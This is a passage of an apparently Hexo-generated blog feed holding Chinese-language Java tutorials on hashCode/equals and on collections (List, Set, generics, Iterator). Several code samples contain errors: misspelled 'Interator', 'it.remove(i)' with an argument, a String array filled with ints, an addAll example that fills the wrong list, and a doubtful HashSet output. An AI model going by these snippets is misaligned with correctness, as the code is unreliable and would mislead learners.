punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> tb<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 2556 1829164700</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="center">对象</th><th align="center">散列码</th></tr></thead><tbody><tr><td align="center">s</td><td align="center">2556</td></tr><tr><td align="center">sb</td><td align="center">366712642</td></tr><tr><td align="center">t</td><td align="center">2556</td></tr><tr><td align="center">tb</td><td align="center">1829164700</td></tr></tbody></table><p>可以看到，字符串 s 与 t 拥有相同的散列码，这是因为字符串的散列码是由内容计算的，而 StringBuilder 类的 sb 和 tb 却有着不同的散列码，这是因为在 StringBuilder 类中没有定义 hashCode 方法，所以它的散列码是由 Object 类默认的 hashCode 方法导出的对象存储地址。</p><p><strong>equals 与 hashCode 的定义必须一致：如果 x.queals(y) 返回 true，那么 x.hashCode 就必须与 y.hashCode() 具有相同的值。</strong></p><p>equals()相等的两个对象，hashcode()一定相等；<br>equals（）不相等的两个对象，hashcode()可能相等，也可能不等。</p><p>反过来：hashcode()不等，一定能推出 equals()也不等；hashcode()相等，equals()可能相等，也可能不等。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 散列码 </tag>
            
            <tag> hash code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>集合</title>
      <link href="/2017/03/17/ji-he/"/>
      <url>/2017/03/17/ji-he/</url>
      
        <content type="html"><![CDATA[<p>在实际开发中，经常需要将使用的对象存储于特定数据结构中。Java 提供了这样的容器：数组与集合，但是数组是定长的，操作数据过于繁琐，所以今天在这里介绍下集合。</p><span id="more"></span><h2 id="Collection-（接口）"><a href="#Collection-（接口）" class="headerlink" title="Collection （接口）"></a>Collection （接口）</h2><p>集合：不定长，集合操作相对简单。<strong>Collection 是一个接口</strong>，定义了集合的相关操作方法，它有两个子<strong>接口</strong>：List 和 Set。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Collection</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Collection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">List</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Set</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>以上三行都会报错，<strong>接口不能实例化</strong></p></blockquote><br>### ListList 是可重复元素，且有序(与放入顺序一致)的集合。&gt;元素是否重复取决于元素自身的 equals 比较<p>实现 List 接口的类有两个： ArrayList 和 LinkedList。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Collection</span> al <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建 ArrayList 集合，当然也可以用 List 声明</span><span class="token class-name">List</span> ll <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建 LinkedList 集合</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>List 是有序可重复的：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">al<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>al<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>al<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>al<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>al<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>al<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,2,3,2,3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### SetSet 无序且不可重复的集合，实现 Set 接口的类也有两个：HashSet 和 TreeSet。&gt;因为不能重复，所以最多也只能包含一个 null。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Set</span> hs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建 HashSet 集合</span><span class="token class-name">Set</span> ts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建 TreeSet 集合</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [3,2,1]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>集合存储的元素数据类型可以不固定，但最好在使用时统一数据类型，方便后续操作</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//字符串类型</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token char">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//字符类型</span>hs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//int 类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>## Collection 的核心方法 ##### add 方法**add(E e)方法会将给定的元素 e 添加到集合中，返回 boolean 类型值，添加成功返回 true， 否则返回 false。**&gt;一般并不需要使用它的返回值<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> isAdd <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"添加元素 one 是否成功："</span> <span class="token operator">+</span> isAdd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合 list 为："</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [one, two, three, four]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### contains 方法**contains(Object o)方法用于判断给定元素是否被包含在集合中，并返回 boolean 类型值，包含则返回 true，否则返回 false。（根据 equals 比较）**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> isContains <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"该集合是否包含 three："</span> <span class="token operator">+</span> isContains<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>isContains <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"five"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"该集合是否包含 five："</span> <span class="token operator">+</span> isContains<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>### remove 方法**remove(Objct o)方法用于从集合中删除给定元素，并返回 boolean 类型值。删除成功则返回 true，否则返回 false。**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> isRemove <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"从集合中删除 two 元素是否成功："</span> <span class="token operator">+</span> isRemove<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合 list 为："</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [one, three, four]</span>isRemove <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"five"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"从集合中删除 five 元素是否成功："</span> <span class="token operator">+</span> isRemove<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### size 方法集合中的 **size() 方法**与数组中的 length 方法类似，**返回当前集合中的元素个数(int 类型)**。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合 list 中元素的个数为："</span> <span class="token operator">+</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>### clear 方法clear() 方法可以清空集合中的所有元素。该方法没有返回值。<pre class="line-numbers language-java" data-language="java"><code class="language-java">list<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合 list 为："</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>### isEmpty 方法**isEmpty() 方法用于判断当前集合是否为空（不包含任何元素），并返回 boolean 类型值，集合为空则返回 true，否则返回 false。**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"该集合不包含任何元素"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"该集合包含元素"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"five"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"该集合不包含任何元素"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"该集合包含元素"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### addAll 方法**addAll(Collection c) 方法需要传入一个集合，并将传入的集合中所有元素添加到当前元素集合，并返回 boolean 类型值，如果当前集合发生改变，则返回 true，否则返回 false。**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span> arrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span> linkedList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> addAll <span class="token operator">=</span> arrayList<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>linkedList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"arrayList 中是否添加了 linkedList 中的全部元素："</span> <span class="token operator">+</span> addAll<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合 arrayList 为："</span> <span class="token operator">+</span> arrayList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### containsAll 方法**containsAll(Collection c) 方法需要传入一个集合，判断当前集合是否包含传入集合中的所有元素，并返回 boolean 类型值，若包含则返回 true，否则返回 false。**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> isContainsAll <span class="token operator">=</span> arrayList<span class="token punctuation">.</span><span class="token function">containsAll</span><span class="token punctuation">(</span>linkedList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"arrayList 中是否包含 linkedList 中的全部元素"</span> <span class="token operator">+</span> isContainsAll<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>linkedList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>isContainsAll <span class="token operator">=</span> arrayList<span class="token punctuation">.</span><span class="token function">containsAll</span><span class="token punctuation">(</span>linkedList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"arrayList 中是否包含 linkedList 中的全部元素"</span> <span class="token operator">+</span> isContainsAll<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="集合与数组之间互换"><a href="#集合与数组之间互换" class="headerlink" title="集合与数组之间互换"></a>集合与数组之间互换</h3><p>collection 中定义了一个方法用于将集合转换为数组，所用集合都具备此功能</p><p><strong>T[] toArray(T[] a)</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> i <span class="token operator">=</span> arrayList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"数组 i ："</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>数据转集合：Arrays 类提供了一个静态方法 asList();<br>使用该方法可以讲一个数组转换成对应的集合。<br>List<t> Arrays.asList(数组);<br>该方法会将数组转换成集合（只能是 List 集合）<br>返回的集合元素由数组类型决定。</t></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>返回的集合我们不能增删元素，否则抛出异常</strong>。因为操作集合都会影响到数组，而增删元素会导致数组的扩容与缩容。</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//list.add("7");//</span><span class="token comment">//解决方法所有几何都支持一个 Collection 作为参数的构造方法，该构造方法的作用是创建当前集合的同时包含给定集合所有的元素。</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>对集合修改会影响数组对应的元素</strong>。</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">list<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>更多方法请自行查看 API</p></blockquote><br>## 泛型 ##Java 5.0 引入的新特性，定义了泛型，意味着所操作的数据类型被指定。Java 泛型广泛应用在集合中，所有集合类都带有泛型参数，这样在创建集合的时候可以指定存放集合元素的类型，减少错误。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//创建集合 List 并指定元素为 String 类型</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//编译错误，只能放 String 类型的数据。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>编译器会根据泛型来检查元素类型是否匹配。</p></blockquote><br>## Iterator 迭代器（接口） ##迭代器用于遍历集合，获取迭代器可以使用 Collection 提供的 iterator 方法。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Interator 提供一同一遍历集合元素的方式，<br>boolean hasNext():<br>用于判断当前集合是否有可迭代的元素。</p><p>E next():<br>用于去除当前迭代的元素。E 代表泛型。</p><p>迭代器遍历集合应遵循 <code>问，取，删</code> 规则，其中删除不是必须。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,0,2,0,3,0,4,0,5]</span><span class="token comment">//获取迭代器</span><span class="token class-name">Interator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> it <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">interator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//进行遍历</span><span class="token keyword">while</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//问，是否含有元素</span><span class="token keyword">int</span> i <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//取，获取该元素</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//非基本类型用 equals</span><span class="token comment">//list.remove(i);//运行异常，使用迭代器遍历集合时，不能使用集合的 remove()方法，需要使用迭代器的删除方法。</span>it<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删，删除该元素</span><span class="token punctuation">}</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>使用迭代器遍历集合时，不能使用集合的 remove()方法，需要使用迭代器的删除方法。<br>迭代器提供了 remove 方法，可以将调用迭代器的 next() 取出的元素删除。</p></blockquote><br>### 增强型 for 循环增强型 for 循环 是 Java 5.0 